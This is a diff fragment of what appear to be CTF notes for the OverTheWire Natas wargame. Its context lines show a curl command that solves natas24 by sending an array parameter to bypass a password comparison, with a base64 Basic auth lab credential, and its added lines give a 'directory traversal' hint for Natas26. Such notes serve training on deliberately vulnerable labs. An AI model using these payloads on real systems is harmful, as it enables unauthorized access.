@@ -26,3 +26,8 @@ Ans:
 $ curl "http://natas24.natas.labs.overthewire.org/index.php" --data-urlencode "passwd[0]={asd}" -H "Authorization: Basic bmF0YXMyNDpPc1JtWEZndW96S3BUWlo1WDE0ek5PNDMzNzlMWnZlZw=="
 
 ```
+
+## Natas26
+Hint:
+Directory traversal still works.
+
